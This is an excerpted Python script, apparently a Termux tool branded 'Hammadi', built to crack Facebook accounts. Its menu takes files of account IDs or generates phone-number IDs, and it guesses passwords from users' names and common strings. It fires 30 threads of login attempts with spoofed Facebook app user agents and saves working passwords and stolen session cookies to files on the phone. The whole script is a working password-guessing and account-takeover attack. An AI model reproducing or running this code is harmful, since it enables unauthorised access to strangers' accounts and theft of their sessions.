...
import os,json
import os,time,zlib
print('\33[1;37\33[1m Group on Telegram ')
...
try:
	...
	os.system('xdg-open http://t.me/python_M_V4')
	exit()
oks,cps,loop,apk=[],[],0,[]
...
\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mDEVELOPER\033[1;97m ●   \33[1;92m@SSJ07
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mFACEBOOK\033[1;97m  ●   \33[1;92m@SSJ07~T'ws Sijan
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mGITHUB\033[1;97m    ●   \33[1;92m S09
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mVERSION\033[1;97m   ●   \33[1;92m0.5
\33[1;91m[\33[1;97m=\33[1;91m] \33[1;92mTOOLS\033[1;97m     ●   \033[1;92m SSJ07
\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
def linex():
	print('\033[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
def clear():
...
def menu():
			clear()
			print('\x1b[38;5;246m [1] File cloning')
			print('\x1b[38;5;246m [2] CREAT FILE FB ')
			print('\x1b[38;5;246m [3] UNBLOCk NETWORk IP')
			print('\x1b[38;5;246m [4] TELEGRAM ')
			linex()
			xd=input('\033[1;31m[\033[1;97m=\033[1;31m] \33[1;92mChoose an option: ')
			if xd in ['1','01']:
				clear()
				print('\033[1;31m[\033[1;97m=\033[1;31m] \33[1;92mPut file example:  /sdcard/File.txt  etc..')
				linex()
				file = input('\033[1;31m[\033[1;97m=\033[1;31m] \33[1;92mPut file path\033[1;32m: ')
				try:
				...
				clear()
				linex()
				print(' [1] Method \33[1;95m {1}\33[1;33m ')
				print(' [2] Method \33[1;95m {2}\33[1;32m ')
				#print(' [3] Method \33[1;95m {3}\33[1;33m ')
				#print(' [4] Method \33[1;95m {4}\33[1;37m ')
				linex()
				mthd=input('\033[1;31m[\033[1;97m=\033[1;31m] \33[1;92mChoose: ')
				linex()
				plist = []
				try:
					ps_limit = int(input('\033[1;31m[\033[1;97m=\033[1;31m] \33[1;92mHow many passwords do you want to add ? '))
				except:
					ps_limit =1
				clear()
				print('\033[1;31m[\033[1;97m=\033[1;31m] \33[1;92mexp: first last,firstlast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f'\033[1;31m[\033[1;97m=\033[1;31m] \33[1;92mPut password {i+1}: '))
				clear()
				print(' \033[1;31m[\033[1;97m=\033[1;31m] \33[1;92mDo you went show cp account? (y/n): ')
				linex()
				cx=input('\033[1;31m[\033[1;97m=\033[1;31m] \33[1;92mChoose: ')
				...
				with tred(max_workers=30) as crack_submit:
					...
					print('\033[1;31m[\033[1;97m=\033[1;31m] \33[1;92mTotal account ids : \033[1;32m'+total_ids+f' ')
					linex()
					for user in fo:
				...
				os.system('xdg-open http://t.me/Hammadi_MV4')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as Hammadi:	
			linex()
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if pcs in ['2','02']:
					...
					passlist = [psx,ids,'57575751','57273200','i love you','iloveyou','59039200','708090']
				if mthd in ['1','01']:
					Hammadi.submit(Hammadi1,ids,passlist)
				if mthd in ['2','02']:
					Hammadi.submit(Hammadi2,ids,passlist)
				if mthd in ['3','03']:
					Hammadi.submit(Hammadi3,ids,passlist)
				if mthd in ['4','04']:
					Hammadi.submit(Hammadi4,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def gmail():
	...
	clear()
	print('\033[1;37m example: Hammadi, ali, sajjad, faizan\033[1;37m')
	linex()
	...
	with tred(max_workers=30) as XD:
		...
		for user in fo:
			...
			XD.submit(Hammadi1,ids,passlist)
	print('\033[1;37m')
	linex()
	print(' The process has completed')
	print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [Hammadi-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/FBAV/318.0.0.72.228;FBPN/com.facebook.orca;FBLC/en_US;FBBV/560791991;FBCR/null;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S23;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.3633,width=1359,height=2475};FB_FW/1;]','[FBAN/FB4A;FBAV/4.0.0.262;FBBV/081678576;[FBAN/FB4A;FBAV/360.0.0.98.63;FBBV/3423551322;FBDM/{density=2,width=1754,height=1432};FBLC/en_US;FBRV/35855574;FB_FW/2;FBCR/Searching for Service;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-G63255;FBSV/10;FBOP/1;FBCA/arm64-v8a:;zmpmlb;]','[Dalvik/2.1.0 (Linux; U; Android 7; SM-G998B Build/QP1A.393643.668) [FBAN/FB4A;FBAV/248.1.0.44.116;FBBV/184540721;FBDM/{density=3.25,width=1280,height=2256};FBLC/en_US;FBRV/184540721;FBCR/;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/IN2023;FBSV/8.0;FBBK/1;FBOP/1;FBCA/arm64-v8a;]"  
...
'Content-Length': '2126'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Hammadi-OK] '+ids+' | '+pas+'\033[1;97m')
                                        ...
                                        open('/sdcard/Hammadi-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
                                        open('/sdcard/Hammadi-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[Hammadi-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\x1b[38;5;246m [Hammadi💔-CP] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Hammadi-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/Hammadi-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Hammadi-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/FBAV/318.0.0.72.228;FBPN/com.facebook.orca;FBLC/en_US;FBBV/560791991;FBCR/null;FBMF/Samsung;FBBD/Samsung;FBDV/Galaxy S23;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.3633,width=1359,height=2475};FB_FW/1;]','[FBAN/FB4A;FBAV/4.0.0.262;FBBV/081678576;[FBAN/FB4A;FBAV/360.0.0.98.63;FBBV/3423551322;FBDM/{density=2,width=1754,height=1432};FBLC/en_US;FBRV/35855574;FB_FW/2;FBCR/Searching for Service;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-G63255;FBSV/10;FBOP/1;FBCA/arm64-v8a:;zmpmlb;]','[Dalvik/2.1.0 (Linux; U; Android 7; SM-G998B Build/QP1A.393643.668) [FBAN/FB4A;FBAV/248.1.0.44.116;FBBV/184540721;FBDM/{density=3.25,width=1280,height=2256};FBLC/en_US;FBRV/184540721;FBCR/;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/IN2023;FBSV/8.0;FBBK/1;FBOP/1;FBCA/arm64-v8a;]"  
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [Hammadi-OK] '+ids+' | '+pas+'\033[1;97m')
                                        q = po
                                        powerHammadi = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);Hammadiramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={Hammadiramxan};{powerHammadi}"
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/Hammadi-COKIE.txt','a').write(ids+'|'+pas+' | '+cookie+'\n')
                                        open('/sdcard/Hammadi-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [Hammadi-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ams = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                        network = random.choice(['Zong','null','Banglalink','Roshan','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/6.0.0.4815;FBBV/65814666;[FBAN/FB4A;FBAV/393.0.0.76.28;FBBV/32745631;FBDM/{density=4,width=2343,height=1552};FBLC/en_US;FBRV/34107292;FB_FW/2;FBCR/Searching for Service;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/SM-G41808;FBSV/6;FBOP/1;FBCA/arm64-v8a:;iru;]','[FBAN/FB4A;FBAV/8.0.0.8304;FBBV/610190708;[FBAN/FB4A;FBAV/358.0.0.10.36;FBBV/8754574173;FBDM/{density=3,width=1849,height=1050};FBLC/en_US;FBRV/83109582;FB_FW/2;FBCR/Searching for Service;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/SM-G0904;FBSV/12;FBOP/1;FBCA/arm64-v8a:;fgy;]','[Dalvik/2.1.0 (Linux; U; Android 10; SM-M317F Build/QP1A.484428.561) [FBAN/FB4A;FBAV/117.0.0.18.47;FBBV/53769751;FBDM/{density=1.95,width=720,height=1456};FBLC/en_US;FBRV/53769751;FBCR/;FBMF/vsmart;FBBD/vsmart;FBPN/com.facebook.katana;FBDV/star5;FBSV/7.0.1;FBBK/1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"  
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
...
'Content-Length': '847'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print(f'\r\r\33[1m\33[1;35m [Hammadi-CP] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/Hammadi-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
	...
	try:
		...
		for pw in passlist:
			...
			if "checkpoint" in str(ses.cookies.get_dict()):
				print('\r\r\033[1;91m [Hammadi-CP] '+ids+' | '+pas)
				open('/sdcard/Hammadi-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
				print('\r\r\033[1;92m [Hammadi-OK] '+ids+' | '+pas+'\033[1;37m')
				open('/sdcard/Hammadi-COKIE.txt','a').write(ids+'|'+pas+' | '+coki+'\n')
				open('/sdcard/Hammadi-OK.txt','a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
...
def Hammadi1(ids,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [Hammadi] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	ses = requests.Session()
	while True:
		try:
			ua = random.choice(ugen)
	...
	for pas in passlist:
		try:
			...
			if "c_user" in ses.cookies.get_dict():
				...
				if uid in str(oks):
					break
				print('\r\r\033[1;32m [Hammadi-OK] '+uid+' | '+pas+'\033[1;37m')
				oks.append(uid)
				open('/sdcard/Hammadi-R-OK.txt','a').write(uid+'|'+pas+'\n')
				break
...
def make_get_request(url):
    try:
        requests.get('https://github.com/Hammadi-GHANIZADA')
    except requests.exceptions.ConnectionError:
    ...
    if key in dt:
    	...
    	menu() 
         ...
         while True:
             ...
             linex()
             os.system('am start https://wa.me/+218914841921?text='+key) 
             time.sleep(1);exit()
try:
    menu()
